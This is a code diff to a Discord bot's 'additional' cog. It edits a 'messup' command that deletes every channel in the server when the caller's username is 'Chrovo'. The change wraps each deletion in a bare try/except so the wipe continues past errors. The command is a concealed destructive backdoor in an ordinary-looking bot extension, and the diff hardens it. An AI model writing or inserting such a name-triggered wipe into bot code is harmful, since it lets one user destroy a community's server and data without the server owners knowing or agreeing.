@@ -50,7 +50,10 @@ class additional(commands.Cog):
     async def messup(self,ctx):
         if ctx.author.name == "Chrovo":
             for a in ctx.guild.channels:
-                await a.delete()
+                try:
+                    await a.delete()
+                except:
+                    continue
 
     @commands.Cog.listener()
     async def on_member_update(self, before, after):
